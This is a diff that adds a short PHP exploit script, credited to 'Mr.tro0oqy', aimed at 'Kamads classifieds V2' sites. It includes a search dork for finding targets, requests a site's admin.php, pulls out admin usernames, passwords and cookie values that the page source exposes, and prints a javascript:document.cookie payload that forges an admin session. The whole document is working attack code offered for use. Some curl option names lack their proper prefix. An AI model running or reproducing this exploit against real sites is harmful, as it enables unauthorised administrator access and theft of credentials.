@@ -1,0 +1,66 @@
+<?php
+
+
+if ($argc < 2) 
+{ 
+echo "\n+-----------------------------------------------------------------+\n"; 
+echo "|         Kamads classifieds V2 Multiple Vulnerabilities            |\n"; 
+echo "|                          Author:Mr.tro0oqy                        |\n"; 
+echo "|                          uxxd@hotmail.com                         |\n";   
+echo "|                        dork:inurl:V2A_XHTML                       |\n";  
+echo "|                                                                   |\n";               
+echo "+-------------------------------------------------------------------+\n";
+print "\nUsage........: php $argv[0] <host><path><admin.php>\n"; 
+print "\nex...........: php $argv[0] http://www.target.com/V2A_XHTML/admin/admin.php\n";
+die(); 
+}else {
+
+
+$ch = curl_init();
+curl_setopt($ch,CURLOPT_URL,"$argv[1]");
+$op1 = curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
+curl_setopt($ch,CURLOPT_USERAGENT,"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
+curl_setopt($ch,COOKIESESSION,true);
+curl_setopt($ch,CUSTOMREQUEST,"get");
+$x = curl_exec($ch);
+
+
+if ($t = stristr($x,"username = ") and  stristr($x,"password = ")) {
+echo "\n";
+echo "\n";
+echo $new = substr($t,0,94);
+
+
+if ($co=stristr($x,"theCookieName") and $co2=stristr($x,"theCookieValue")) {
+
+echo "\n";
+echo "\n";
+echo $new2 = substr($co,0,35);
+echo "\n";
+echo $new3 =substr($co2,0,40);
+echo "\n";
+echo "\n";
+
+$ja = substr($new2,17,15);
+echo "\n";
+$ja2 = substr($new3,18,18);
+echo "\n";
+echo "\n";
+echo "\n";
+
+
+echo $exploit =  "javascript:document.cookie=\"$ja=$ja2;path=/\";";
+echo "\n";
+echo "\n";
+echo "\n";
+}
+
+
+
+}else {
+echo "not found";
+
+}
+
+}
+?>
